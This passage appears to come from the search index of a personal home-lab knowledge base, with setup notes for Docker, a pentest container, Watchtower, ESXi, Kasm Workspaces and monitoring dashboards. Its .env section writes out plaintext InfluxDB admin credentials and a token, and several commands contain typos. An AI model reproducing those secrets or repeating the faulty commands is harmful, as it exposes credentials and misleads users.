container prune</code> To remove all unused docker containers <code>docker volume prune</code> To remove all unused docker volumes <code>docker network prune</code> To remove all unused docker network"},{"location":"Knowledge_Base/Home_Lab/Docker/#container-commands","title":"Container commands","text":"command description <code>docker start</code> To start a Docker container <code>docker stop</code> To stop a running docker container <code>docker restart</code> To restart docker container <code>docker pause</code> To pause a running container <code>docker unpause</code> To unpause a running container <code>docker run</code> Creates a docker container from docker image <code>docker ps</code> To list Docker containers <code>docker exec</code> To Access the shell of Docker Container <code>docker logs</code> To view Logs for a Docker Container <code>docker rename</code> To rename Docker Containe <code>`docker rm</code> To remove Docker container <code>docker inspect</code> Docker container info command <code>docker attach</code> Attach Terminal to Running container <code>docker kill</code> To stop and remove Docker containers <code>docker cp</code> To copy files or folders between a container and from local filesystem."},{"location":"Knowledge_Base/Home_Lab/Docker/#hub-commands","title":"Hub commands","text":"command description <code>docker search</code> To search docker image <code>docker pull</code> To pull image from docker hub <code>docker login</code> To Log in to a Docker registry <code>docker push</code> Push an image or a repository to a registry <code>docker tag</code> Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE <code>docker logout</code> To logout from Docker Hub Registry"},{"location":"Knowledge_Base/Home_Lab/Docker/#logs-and-monitoring-commands","title":"Logs and Monitoring commands","text":"command description <code>docker ps -a</code> To show running and stopped containers <code>docker logs</code> To show Docker container logs <code>docker events</code> To get all events of docker container <code>docker top</code> To show running process in docker container <code>docker stats</code> To check cpu, memory and network I/O usage <code>docker port</code> To show docker containers public ports"},{"location":"Knowledge_Base/Home_Lab/Docker/#docker-pentest-container","title":"docker pentest container","text":""},{"location":"Knowledge_Base/Home_Lab/Docker/#install-steps","title":"Install steps","text":"<pre><code>git clone --depth 1 https://github.com/aaaguirrep/pentest.git\ncd pentest\ndocker build -t pentest .\ndocker run --rm -it --name my-pentest pentest /bin/zsh\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Docker/#use-cases","title":"Use cases","text":"<p>Use the container to access HTB (Hack the Box) machines by HTB vpn</p> <pre><code>docker run --rm -it --cap-add=NET_ADMIN --device=/dev/net/tun --sysctl net.ipv6.conf.all.disable_ipv6=0 --name my-pentest aaaguirrep/pentest /bin/zsh\n</code></pre> <p>Share information from your local directory to container directory and save information on your local directory. You should save information under /pentest directory.</p> <pre><code>docker run --rm -it -v /path/to/local/directory:/pentest --name my-pentest aaaguirrep/pentest /bin/zsh\n</code></pre> <p>Expose internal container services (apache, squid) for your local environment</p> <pre><code>docker run --rm -it --name my-pentest -p 80:80 -p 3128:3128 aaaguirrep/pentest /bin/zsh\n</code></pre> <p>Inside the container start apache2 and squid services by the aliases</p> <pre><code>apacheUp\nsquidUp\n</code></pre> <p>Mount directories by umount command</p> <pre><code>docker run --rm -it --privileged --name my-pentest aaaguirrep/pentest /bin/zsh\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Docker/#watchtower-automating-docker-container-base-image-updates","title":"Watchtower (automating Docker container base image updates)","text":""},{"location":"Knowledge_Base/Home_Lab/Docker/#resource","title":"Resource","text":"<ul> <li>Project Homepage</li> <li>Github</li> </ul>"},{"location":"Knowledge_Base/Home_Lab/Docker/#steps","title":"Steps","text":""},{"location":"Knowledge_Base/Home_Lab/Docker/#how-to-update-docker-container-automatically-with-nearly-zero-downtime","title":"How To Update Docker Container automatically with nearly zero downtime","text":"<p>How to update docker container automatically with Watchtower. Scheduled updates without owntime for your entire docker environment.</p> <p>We will use the free and open-source software Watchtower.</p>"},{"location":"Knowledge_Base/Home_Lab/Docker/#prerequisites","title":"Prerequisites","text":"<p>Linux Server running Docker</p>"},{"location":"Knowledge_Base/Home_Lab/Docker/#run-watchtower","title":"Run Watchtower","text":"<p>Watchtower can be easily deployed by executing a simple docker run command.</p> <pre><code>docker run -d \\\n--name watchtower \\\n-v /var/run/docker.sock:/var/run/docker.sock \\\ncontainrrr/watchtower\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Docker/#run-watchtower-in-debug-mode","title":"Run Watchtower in debug mode","text":"<p>You might wonder why there is no log output apart from the welcome message. If you want to ncrease the logging level or watchtower, you simply just add an argument.</p> <pre><code>docker run --name watchtower -v /var/run/docker.sock:/var/run/docker.sock containrrr/atchtower --debug\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Docker/#run-watchtower-only-once-in-debug-mode","title":"Run Watchtower only once, in debug mode","text":"<pre><code>docker run --name watchtower -v /var/run/docker.sock:/var/run/docker.sock containrrr/atchtower --run-once --debug\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Docker/#exclude-container-from-watchtower","title":"Exclude Container from Watchtower","text":"<p>Replace the nginx with your docker container name</p> <pre><code>docker run -d --label=com.centurylinklabs.watchtower.enable= false nginx\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Docker/#scheduled-updates-and-clean-up-old-images","title":"Scheduled Updates and clean up old images","text":"<pre><code>docker run --name watchtower -v /var/run/docker.sock:/var/run/docker.sock --restart unless-stopped containrrr/watchtower --schedule \"0 0 4 * * *\" --debug --cleanup\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Esxi/","title":"Esxi","text":""},{"location":"Knowledge_Base/Home_Lab/Esxi/#esxi-backup","title":"Esxi Backup","text":"<p>nakivo</p>"},{"location":"Knowledge_Base/Home_Lab/Esxi/#clipboard-copy-paste","title":"Clipboard copy &amp; paste","text":"<p>Power off VM</p> <p></p> <p></p> <p>Search for parameters and set value, if not there then create a new parameter.</p> <p><code>isolation.tools.copy.disable</code> false <code>isolation.tools.paste.disable</code> false</p> <p></p>"},{"location":"Knowledge_Base/Home_Lab/Esxi/#esxi-dell-custom-bootable","title":"ESXI Dell custom bootable","text":"<p>how to create a bootable usb device with rufus to update dell servers</p> <pre><code>1-Download the tool to a Windows system\n2-Create a Smart Bootable ISO using the Dell Repository Manager (DRM)  or Download the matching ISO /Knowledge_Base/images/ESXI_098_ for the server you want to update from this list of repositories\nStart the tool\nInsert a USB device  (Rufus will auto-select if USB device)\nChoose the created or downloaded ISO-file  (Rufus will select the appropriate settings)\n\n    Partition Screen = MBR\n    File System = FAT32\n    Cluster Size = 1024\n\nClick on Start to create the media\nRestart the server and boot from the created device\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Esxi/#esxi-patching-upgrade","title":"Esxi Patching &amp; Upgrade","text":"<p>Make sure to update the Volume, zip file name and -p image name</p> <pre><code>esxcli software profile update -p ESXi-7.0U3g-20328353-standard -d /vmfs/volumes/62dcbea6-4709q3467-54da-c81f66ef4sdf/VMware-ESXi-7.0U3g-20328353-depot.zip --no-hardware-warning\n</code></pre> <p>https://customerconnect.vmware.com/patch</p> <pre><code>esxcli software profile update -p ESXi-7.0U3k-21313628-standard -d /vmfs/volumes/62dcbea6-47095c67-er4a-c81f621dsf4d67/VMware-ESXi-7.0U3k-21313628-depot.zip --no-hardware-warning\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Esxi/#upgrade-rollback","title":"Upgrade rollback","text":"<p>4sysops</p>"},{"location":"Knowledge_Base/Home_Lab/Esxi/#defragmenting-and-shrinking-disks","title":"Defragmenting and shrinking disks","text":"<p>Caution:\u00a0Do not shut down your virtual machine or the host machine while the disk is shrinking. In addition, do not try to cancel the process. Interrupting this process can cause irreparable damage to your virtual disk and you may not be able to start your virtual machine again.</p> <ul> <li> <p>1- Remove snapshots for the VM &gt;[all of them]</p> </li> <li> <p>2- OS Based steps</p> <ul> <li> <p>Windows</p> <p>To run a disk defragment within Windows, follow the instructions from Microsoft - Windows XP\u00a0How to Defragment Your Disk Drive Volumes in Windows XP - Windows Vista\u00a0Improve performance by defragmenting your hard disk - Windows 7\u00a0Improve performance by defragmenting your hard disk - Windows 8\u00a0Improve performance by defragmenting your hard disk - Windows 10\u00a0Improve performance by defragmenting your hard disk</p> <p>Shrinking the Virtual disk</p> <p>After defragmenting the virtual disk, use VMware Tools to erase empty disk sectors at the end of the disk to free the unused space.</p> <p>Double-click the VMware Tools icon in the system tray, or click\u00a0Start &gt; Control Panel &gt; VMware Tools &gt; Click Shrink &gt; Select Drive &gt; Click Prepare to shrink</p> </li> <li> <p>Linux</p> <p>Ununtu defragment</p> <pre><code>#no need to unmount disk\nsudo e4defrag -c /path/x/x/x\n\n#if you want to force it\nsudo e4defrag /path/x/x/x\n</code></pre> <p>Shrinking the Virtual disk</p> <pre><code>sudo vmware-toolbox-cmd disk shrinkonly\n</code></pre> </li> </ul> </li> </ul>"},{"location":"Knowledge_Base/Home_Lab/GW_NAT_%26_Cloudflare/","title":"GW NAT & Cloudflare","text":""},{"location":"Knowledge_Base/Home_Lab/GW_NAT_%26_Cloudflare/#resources","title":"Resources","text":"<p>https://developers.cloudflare.com/fundamentals/get-started/reference/network-ports/</p>"},{"location":"Knowledge_Base/Home_Lab/GW_NAT_%26_Cloudflare/#ports","title":"Ports","text":"<p>HTTP ports supported by Cloudflare - 80 - 8080 - 8880 - 2052 - 2082 - 2086 - 2095</p>"},{"location":"Knowledge_Base/Home_Lab/GW_NAT_%26_Cloudflare/#https-ports-supported-by-cloudflare","title":"HTTPS ports supported by Cloudflare","text":"<ul> <li>443</li> <li>2053</li> <li>2083</li> <li>2087</li> <li>2096</li> <li>8443</li> </ul>"},{"location":"Knowledge_Base/Home_Lab/GW_NAT_%26_Cloudflare/#ports-supported-by-cloudflare-but-with-caching-disabled","title":"Ports supported by Cloudflare, but with caching disabled","text":"<ul> <li>2052</li> <li>2053</li> <li>2082 </li> <li>2082</li> <li>2083</li> <li>2086</li> <li>2087</li> <li>2095</li> <li>2096</li> <li>8880</li> <li>8443</li> </ul>"},{"location":"Knowledge_Base/Home_Lab/Hak5_WiFi_Pineapple/","title":"Hak5 WiFi Pineapple","text":"<p>factory-reset-and-recovery Recovery Firmware obtained from https://downloads.hak5.org/pineapple/mk7</p> <p>Connect the WiFi Pineapple to your computer via USB cable and configure your Network</p> <p></p> <p></p> <p></p> <p>Wait until you get a solid blue light, that\u2019s when the recovery is complete. Now navigate to http://172.16.42.1:1471 Update the Pineapple and configure it</p>"},{"location":"Knowledge_Base/Home_Lab/Heimdall_Dashboard_Portainer_Docker/","title":"Heimdall Dashboard Portainer Docker","text":"<p>heimdall docker yaml configuration file</p> <pre><code>---\nversion: \"2.1\"\nservices:\nheimdall:\n    /Knowledge_Base/images/heimdall_docker_: lscr.io/linuxserver/heimdall:latest\n    container_name: heimdall\n    environment:\n    - PUID=1000\n    - PGID=1000\n    - TZ=America/New_York\n    volumes:\n    - /var/lib/docker/volumes/heimdall_data/_data:/config\n    ports:\n    - 7789:80\n    - 7790:443\n    restart: always\n</code></pre> <p></p> <p>Sources</p> <ul> <li>heimdall docker hub</li> </ul>"},{"location":"Knowledge_Base/Home_Lab/Homepage_Dashboard/","title":"Homepage Dashboard","text":""},{"location":"Knowledge_Base/Home_Lab/Homepage_Dashboard/#installation-using-docker-compose","title":"Installation using docker compose","text":"<p>This is the non root user method, which is a bit more secure than running as full root user, Yikes!</p> <pre><code>#obtain your user PUID &amp; GUID\nid \n</code></pre> <p>Navigate to a directory where you want to setup the docker image</p> <pre><code>mkdir homepage\ncd homepage\nmkdir config\nmkdir images\nmkdir icons\ntouch docker-compose.yaml\nnano docker-compose.yaml\n</code></pre> <p>Paste the below configuration into the file, make sure you replace the $PUID &amp; $PGID below with the ID number found above</p> <p>Save changes and exit the file once completed</p> <pre><code>---\nservices:\nhomepage:\n    image: ghcr.io/gethomepage/homepage:latest\n    container_name: homepage-dashboard\n    ports:\n    - 3000:3000\n    volumes:\n    - ./config:/app/config # Make sure your local config directory exists\n    - ./images:/app/public/images #incase you want to add custom images\n    - ./icons:/app/public/icons #incase you want to add custom icons\n    environment:\n    PUID: $PUID\n    PGID: $PGID\nrestart: unless-stopped\n</code></pre> <p>deploying the container</p> <pre><code>compose up -d\n</code></pre> <p>check docker container status</p> <pre><code>docker ps\n</code></pre> <p>You should now be able to access the dashboard at http://:3000 <p>You can check custom config here if you don't want to start from scratch ChristianLempa Config</p>"},{"location":"Knowledge_Base/Home_Lab/Homepage_Dashboard/#sources","title":"Sources","text":"<p>gethomepage</p>"},{"location":"Knowledge_Base/Home_Lab/Homer_Dashboard_Portainer_Docker/","title":"Homer Dashboard Portainer Docker","text":""},{"location":"Knowledge_Base/Home_Lab/Homer_Dashboard_Portainer_Docker/#install-homer","title":"Install Homer","text":"<p>I keep all my dockers in a dockers folder in my home directory. If it doesn\u2019t exist already, create this folder:-</p> <pre><code>mkdir ~/dockers\n</code></pre> <p>Now create a folder for Homer to live in.</p> <pre><code>mkdir ~/docker/homer\n</code></pre> <p>Create a folder for the assets</p> <pre><code>mkdir ~/docker/homer/assets\n</code></pre> <p>Change directory to this folder</p> <pre><code>cd ~/docker/homer\n</code></pre> <p>Create a docker-compose.yml file</p> <pre><code>nano docker-compose.yml\n</code></pre> <p>Paste the following. Change the\u00a07500\u00a0part of\u00a07500:8080\u00a0if you want it to listen on an alternative port to port 89.</p> <pre><code>---\nversion: \"2\"\nservices:\nhomer:\n    image: b4bz/homer\n    container_name: homer-home\n    volumes:\n    - ./assets/:/www/assets\n    ports:\n    - 7500:8080\n    environment:\n    - UID=1000\n    - GID=1000\n    restart: unless-stopped\n</code></pre> <p>Save the file with ctl + x, then y to save</p> <p>Run the docker-compose file</p> <pre><code>docker compose up -d\n</code></pre> <ol> <li>Browse to the server IP and the port mentioned in the compose file, eg http://1.1.1.1:89 and you should get the default dashboard.</li> </ol>"},{"location":"Knowledge_Base/Home_Lab/Homer_Dashboard_Portainer_Docker/#configuring-homer","title":"Configuring Homer","text":"<pre><code>/home/app/docker/homer-home/assets\nsudo nano config.yml\n</code></pre> <pre><code>#Config for the Page sections and links\nsudo nano ./docker_prep/homer/data/config.yml\n\n#Icon placement\n./docker_prep/homer/data/tools/\n</code></pre> <pre><code>---\n# Homepage configuration\n# See https://fontawesome.com/v5/search for icons options\n\ntitle: \"Dashboard\"\nsubtitle: \"Homer\"\nlogo: \"logo.png\"\n# icon: \"fas fa-skull-crossbones\" # Optional icon\n\n# Will load Dracula theme.\nstylesheet:\n- \"assets/custom.css\"\n\nheader: true\nfooter: ''\n\n# Optional theme customization\ntheme: default\ncolors:\nlight:\n    highlight-primary: \"#3367d6\"\n    highlight-secondary: \"#4285f4\"\n    highlight-hover: \"#5a95f5\"\n    background: \"#f5f5f5\"\n    card-background: \"#ffffff\"\n    text: \"#363636\"\n    text-header: \"#ffffff\"\n    text-title: \"#303030\"\n    text-subtitle: \"#424242\"\n    card-shadow: rgba(0, 0, 0, 0.1)\n    link: \"#3273dc\"\n    link-hover: \"#363636\"\ndark:\n    highlight-primary: \"#3367d6\"\n    highlight-secondary: \"#4285f4\"\n    highlight-hover: \"#5a95f5\"\n    background: \"#131313\"\n    card-background: \"#2b2b2b\"\n    text: \"#eaeaea\"\n    text-header: \"#ffffff\"\n    text-title: \"#fafafa\"\n    text-subtitle: \"#f5f5f5\"\n    card-shadow: rgba(0, 0, 0, 0.4)\n    link: \"#3273dc\"\n    link-hover: \"#ffdd57\"\n\n# Optional message\n#message:\n#url: https://b4bz.io\n#style: \"is-dark\" # See https://bulma.io/documentation/components/message/#colors for styling options.\n#title: \"Demo !\"\n#icon: \"fa fa-grin\"\n#content: \"This is a dummy homepage demo. &lt;br /&gt; Find more information on &lt;a href='https://github.com/bastienwirtz/homer'&gt;github.com/bastienwirtz/homer&lt;/a&gt;\"\n\n# Optional navbar\nlinks: [] # Allows for navbar (dark mode, layout, and search) without any links\n#links:\n#- name: \"Contribute\"\n#  icon: \"fab fa-github\"\n#  url: \"https://github.com/bastienwirtz/homer\"\n#  target: \"_blank\" # optional html a tag target attribute\n\n# Services\n# First level array represent a group.\n# Leave only a \"items\" key if not using group (group name, icon &amp; tagstyle are optional, section separation will not be displayed).\nservices:\n- name: \"Home lab\"\n    icon: \"fas fa-cloud\"\n    items:\n    - name: \"app\"\n        logo: \"assets/tools/app.png\"\n        subtitle: \"app\"\n        tag: \"app\"\n        url: \"https://172.16.0.17:9876\"\n        target: \"_blank\"\n    - name: \"app Local\"\n        logo: \"assets/tools/app.png\"\n        subtitle: \"app\"\n        tag: \"app\"\n        url: \"https://172.16.0.1:9876\"\n        target: \"_blank\"\n    - name: \"Docker app\"\n        logo: \"assets/tools/app.png\"\n        subtitle: \"cluster 2 app\"\n        tag: \"app\"\n        url: \"https://10.10.10.49:9443/#!/init/admin\"\n        target: \"_blank\"\n\n- name: \"External Services\"\n    icon: \"fas fa-cloud\"\n    items:\n    - name: \"app\"\n        logo: \"assets/tools/app.png\"\n        subtitle: \"\"\n        tag: \"app\"\n        url: \"https://dash.app.com/login\"\n        target: \"_blank\"\n    - name: \"app\"\n        logo: \"assets/tools/app.png\"\n        subtitle: \"\"\n        tag: \"app\"\n        url: \"https://app.com\"\n        target: \"_blank\"\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Homer_Dashboard_Portainer_Docker/#themes","title":"Themes","text":""},{"location":"Knowledge_Base/Home_Lab/Homer_Dashboard_Portainer_Docker/#dracula-theme","title":"Dracula Theme","text":"<p>Homer - Dracula Theme</p> <pre><code>#Install using Git\ngit clone https://github.com/dracula/homer.git\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Homer_Dashboard_Portainer_Docker/#or-you-can-install-it-this-way","title":"OR You can install it this way","text":""},{"location":"Knowledge_Base/Home_Lab/Homer_Dashboard_Portainer_Docker/#install-manually","title":"Install manually","text":""},{"location":"Knowledge_Base/Home_Lab/Homer_Dashboard_Portainer_Docker/#download-httpsgithubcomdraculahomerarchivemasterzip","title":"Download https://github.com/dracula/homer/archive/master.zip","text":"<p>git clone https://github.com/dracula/homer/archive/master.zip</p> <p>Activating theme</p> <p>1- Copy custom.css to www/assets/custom.css. 1- Copy dracula-background.png to www/assets/dracula-background. 3- Put these lines into www/assets/config.yml and save the file, will load Dracula theme</p> <pre><code>stylesheet:\n    - \"assets/custom.css\"\n</code></pre> <p>4- Refresh the page. Boom! It's working.</p>"},{"location":"Knowledge_Base/Home_Lab/Install_InfluxDB%2C_Telegraf_%26_Grafana_with_Docker/","title":"Install InfluxDB, Telegraf & Grafana with Docker","text":""},{"location":"Knowledge_Base/Home_Lab/Install_InfluxDB%2C_Telegraf_%26_Grafana_with_Docker/#resources","title":"Resources","text":"<ul> <li>github tig-stack</li> <li>Youtube video</li> <li>Yaml Validator</li> <li>Telegraf best practices</li> </ul>"},{"location":"Knowledge_Base/Home_Lab/Install_InfluxDB%2C_Telegraf_%26_Grafana_with_Docker/#docker-composeyml","title":"docker-compose.yml","text":"<pre><code>version: \"3\"\n\nservices:\ninfluxdb:\nimage: influxdb:latest\nvolumes:\n    - influxdb-storage:/var/lib/influxdb2:rw\nenv_file:\n    - .env\nentrypoint: [\"./entrypoint.sh\"]\nrestart: on-failure:10\nports:\n    - ${DOCKER_INFLUXDB_INIT_PORT}:8086\n\ntelegraf:\nimage: telegraf:latest\nvolumes:\n    - ${TELEGRAF_CFG_PATH}:/etc/telegraf/telegraf.conf:rw\nenv_file:\n    - .env\ndepends_on:\n    - influxdb\n\ngrafana:\nimage: grafana/grafana-oss:latest\nvolumes:\n    - grafana-storage:/var/lib/grafana:rw\ndepends_on:\n    - influxdb\nports:\n    - ${GRAFANA_PORT}:3000\n\nvolumes:\ngrafana-storage:\ninfluxdb-storage:\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Install_InfluxDB%2C_Telegraf_%26_Grafana_with_Docker/#env","title":".env","text":"<pre><code>DOCKER_INFLUXDB_INIT_MODE=setup\n\n## Environment variables used during the setup and operation of the stack\n#\n\n# Primary InfluxDB admin/superuser credentials\n#\nDOCKER_INFLUXDB_INIT_USERNAME=shgs7XashjdgjksxPPWQ\nDOCKER_INFLUXDB_INIT_PASSWORD=5No4*ada7yasEd2k\nDOCKER_INFLUXDB_INIT_ADMIN_TOKEN=E04wVRvTBo7RxLs87ts65WjQb53Hu2DhiJn_89MqKWbnXNrKhNs78shdsWyG6QyS-JGKqtvAcm9F8zFmc78yxhxwQ==\n\n# Primary InfluxDB organization &amp; bucket definitions\n#\nDOCKER_INFLUXDB_INIT_ORG=Homelab\nDOCKER_INFLUXDB_INIT_BUCKET=telegraf\n\n# Primary InfluxDB bucket retention period\n#\n# NOTE: Valid units are nanoseconds (ns), microseconds(us), milliseconds (ms)\n# seconds (s), minutes (m), houwrs (h), days (d), and weeks (w).\nDOCKER_INFLUXDB_INIT_RETENTION=8w\n\n\n# InfluxDB port &amp; hostname definitions\n#\nDOCKER_INFLUXDB_INIT_PORT=8086\nDOCKER_INFLUXDB_INIT_HOST=influxdb\n\n# Telegraf configuration file\n#\n# Will be mounted to container and used as telegraf configuration\nTELEGRAF_CFG_PATH=./telegraf/telegraf.conf\n\n# Grafana port definition\nGRAFANA_PORT=3000\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Kasm_Workspaces/","title":"Kasm Workspaces","text":""},{"location":"Knowledge_Base/Home_Lab/Kasm_Workspaces/#resources","title":"Resources","text":"<ul> <li>https://kasmweb.com/</li> <li>https://kasmweb.com/docs/latest/admin_guide.html</li> <li>https://kasmweb.com/docs/latest/install/system_requirements.html</li> <li>https://github.com/kasmtech/KasmVNC</li> <li>Single Server Upgrade</li> <li>KASM port change</li> </ul>"},{"location":"Knowledge_Base/Home_Lab/Kasm_Workspaces/#installation","title":"Installation","text":""},{"location":"Knowledge_Base/Home_Lab/Kasm_Workspaces/#creating-a-swap-partition","title":"Creating A Swap Partition","text":"<ul> <li>Swap should be approximately 1gb per concurrent session you expect to run at any given time. Please adjust according to your needs.</li> <li>Default is 1g.</li> </ul> <p>This below is running with 10g, which runs 10 concurrent sessions.</p> <pre><code>sudo fallocate -l 10g /mnt/10GiB.swap\nsudo chmod 600 /mnt/10GiB.swap\nsudo mkswap /mnt/10GiB.swap\nsudo swapon /mnt/10GiB.swap\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Kasm_Workspaces/#verify-swap-file-exists","title":"Verify swap file exists","text":"<pre><code>cat /proc/swaps\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Kasm_Workspaces/#to-make-the-swap-file-available-on-boot","title":"To make the swap file available on boot","text":"<pre><code>echo '/mnt/4GiB.swap swap swap defaults 0 0' | sudo tee -a /etc/fstab\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Kasm_Workspaces/#install","title":"Install","text":"<p>From this link you can obtain the Standard Install command which should contain the updated Kasm release. Single Server Installation \u2014 Kasm 1.14.0 documentation</p> <pre><code>cd /tmp\ncurl -O https://kasm-static-content.s3.amazonaws.com/KASM_release_1.14.0.3a7abb.tar.gz\ntar -xf KASM_release_1.14.0.3a7abb.tar.gz\n\n#If you want to install on default port 443 then run this command.\n#If you want to install with non default port, check the next step\nsudo bash KASM_release/install.sh -L 443\n</code></pre> <p>If you want to install with non default port then change the port number below 8443 to the desired port number.</p> <pre><code>sudo bash KASM_release/install.sh -L 8443\n</code></pre> <p>Log into the Web Application running on port 443 at\u00a0https:// <p>The Default usernames are\u00a0admin@kasm.local\u00a0and\u00a0user@kasm.local. The passwords will be randomly generated and presented at the end of the install unless the\u00a0<code>--admin-password</code>\u00a0or/and\u00a0<code>--user-password</code>\u00a0are specified.</p>"},{"location":"Knowledge_Base/Home_Lab/Kasm_Workspaces/#workspaces-and-registry","title":"Workspaces and registry","text":"<p>Search for registries on github Repository search results \u00b7 GitHub</p> <p></p>"},{"location":"Knowledge_Base/Home_Lab/Kasm_Workspaces/#kasm-cert-install","title":"Kasm Cert Install","text":"<pre><code>#Stop the Kasm Services\nsudo /opt/kasm/bin/stop\n\n#backup and then replace\u00a0kasm_nginx.crt\u00a0&amp;\u00a0kasm_nginx.key file\nsudo cp /opt/kasm/current/certs/kasm_nginx.crt /opt/kasm/current/certs/kasm_nginx_backup.crt\nsudo cp /opt/kasm/current/certs/kasm_nginx.key /opt/kasm/current/certs/kasm_nginx_backup.key\nls /opt/kasm/current/certs\n#Insert value crt\nnano /tmp/kasm_nginx_new.crt\n#insert value key\nnano /tmp/kasm_nginx_new.key\nsudo cp /tmp/kasm_nginx_new.crt /opt/kasm/current/certs/kasm_nginx.crt\nsudo cp /tmp/kasm_nginx_new.key /opt/kasm/current/certs/kasm_nginx.key\nrm /tmp/kasm_nginx_new.crt\nrm /tmp/kasm_nginx_new.key\n\n#Start the Kasm Services\nsudo /opt/kasm/bin/start\n\n#Test if nginx is running correctly. Wait 30 seconds\nsudo docker ps | grep kasm_proxy\n\nsudo cp /opt/kasm/current/certs/KASM_nginx_backup.crt /opt/kasm/current/certs/KASM_nginx.crt\nsudo cp /opt/kasm/current/certs/KASM_nginx_backup.key /opt/kasm/current/certs/KASM_nginx.key\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Kasm_Workspaces/#_1","title":"Kasm Workspaces","text":""},{"location":"Knowledge_Base/Home_Lab/Kasm_Workspaces/#uninstalling-kasm","title":"Uninstalling Kasm","text":"<p>Stop All Kasm services</p> <pre><code>sudo /opt/kasm/current/bin/stop\n</code></pre> <p>Remove any Kasm session containers</p> <pre><code>sudo docker rm -f **$(**sudo docker container ls -qa --filter=\"label=kasm.kasmid\"**)**\n</code></pre> <p>Remove Kasm service containers</p> <pre><code>export KASM_UID=**$(**id kasm -u**)**export KASM_GID=**$(**id kasm -g**)**\nsudo -E docker compose -f /opt/kasm/current/docker/docker-compose.yaml rm\n</code></pre> <p>Remove the Kasm docker network</p> <pre><code>sudo docker network rm kasm_default_network\n</code></pre> <p>Remove the Kasm database docker volume</p> <pre><code>sudo docker volume rm &lt;docker_image&gt;\n</code></pre> <p>Remove the Kasm docker_image</p> <pre><code>sudo docker rmi redis:5-alpine\nsudo docker rmi postgres:9.5-alpine\nsudo docker rmi kasmweb/nginx:latest\nsudo docker rmi kasmweb/share:1.12.0\nsudo docker rmi kasmweb/agent:1.12.0\nsudo docker rmi kasmweb/manager:1.12.0\nsudo docker rmi kasmweb/api:1.12.0\n\nsudo docker rmi $(sudo docker images --filter \"label=com.kasmweb.image=true\" -q)\n</code></pre> <p>Remove the Kasm installation directory structure</p> <p><pre><code>sudo rm -rf /opt/kasm/\n</code></pre> Remove the Kasm User Accounts</p> <p><pre><code>sudo deluser KASM_db\nsudo deluser kasm\n</code></pre> Restart</p> <pre><code>sudo /opt/kasm/current/bin/stop\nsudo /opt/kasm/current/bin/start\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Kasm_Workspaces/#kasm-change-port-after-install","title":"Kasm change port after install","text":"<p>Below is example to change from 443 to 8443</p> <p>Stop All Kasm services</p> <pre><code>sudo /opt/kasm/current/bin/stop\n</code></pre> <p>Update the agent.app.config.yaml with the desired port</p> <pre><code>sudo sed -i \"s/public_port.*/public_port: 8443/g\" /opt/kasm/current/conf/app/agent.app.config.yaml\n</code></pre> <p>(Optional) Verify the changes with the following command</p> <pre><code>sudo grep public_port /opt/kasm/current/conf/app/agent.app.config.yaml\npublic_port: 8443\npublic_port: 8443\n</code></pre> <p>Update the Kasm Nginx proxy configuration to listen on the desired port</p> <pre><code>sudo sed -i \"s/listen.*/listen 8443 ssl ;/g\" /opt/kasm/current/conf/nginx/orchestrator.conf\n</code></pre> <p>(Optional) Verify the changes with the following command</p> <pre><code>sudo grep listen /opt/kasm/current/conf/nginx/orchestrator.conf\nlisten 8443 ssl ;\n</code></pre> <p>Update the docker-compose.yaml to export the desired port for kasm_proxy container</p> <pre><code>sudo sed -i \"s/- \\\"443:443\\\"/- \\\"8443:8443\\\"/g\"  /opt/kasm/current/docker/docker-compose.yaml\n</code></pre> <p>(Optional) Verify the changes with the following command</p> <pre><code>sudo grep kasm_proxy -A5 /opt/kasm/current/docker/docker-compose.yaml\ncontainer_name: KASM_proxy\nKASM_image: \"kasmweb/nginx:latest\"\nports:\n    - \"8443:8443\"\nnetworks:\n    - KASM_default_network\n</code></pre> <p>Remove the KASM_proxy container so it can be recreated using the updated port mapping</p> <pre><code>sudo docker rm -f KASM_proxy\n</code></pre> <p>Start All Kasm services</p> <pre><code>sudo /opt/kasm/current/bin/start\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Kasm_Workspaces/#kasm-docker","title":"Kasm Docker","text":"<p>Default Docker Images</p> <p>If you want to manually pull the docker_images to Kasm Workspaces</p> <pre><code>sudo docker pull docker &lt;docker_image&gt;\n\n#You will need to change the version numbers\nsudo docker pull kasmweb/firefox:1.14.0\nsudo docker pull kasmweb/fedora-38-desktop:1.14.0\nsudo docker pull kasmweb/alpine-318-desktop:1.14.0\nsudo docker pull kasmweb/kali-rolling-desktop:1.14.0\nsudo docker pull kasmweb/core-kali-rolling:1.14.0\nsudo docker pull kasmweb/qbittorrent:1.14.0\nsudo docker pull kasmweb/tor-browser:1.14.0\nsudo docker pull kasmweb/sublime-text:1.14.0\nsudo docker pull kasmweb/ubuntu-jammy-dind:1.14.0\nsudo docker pull kasmweb/postman:1.14.0\nsudo docker pull kasmweb/remmina:1.14.0\nsudo docker pull kasmweb/remnux-focal-desktop:1.14.0\nsudo docker pull kasmweb/core-parrotos-5:1.14.0\nsudo docker pull kasmweb/libre-office:1.14.0\nsudo docker pull kasmweb/telegram:1.14.0\nsudo docker pull kasmweb/pinta:1.14.0\nsudo docker pull kasmweb/filezilla:1.14.0\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Kasm_Workspaces/#cleaning-old-unused-images","title":"Cleaning old &amp; unused Images","text":"<pre><code>sudo docker image ls\nsudo docker image prune -a\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Kasm_Workspaces/#changing-max-concurrent-docker-pulls","title":"Changing MAX Concurrent Docker Pulls","text":"<p>Stop the Agent Services</p> <pre><code>sudo /opt/kasm/bin/stop\n</code></pre> 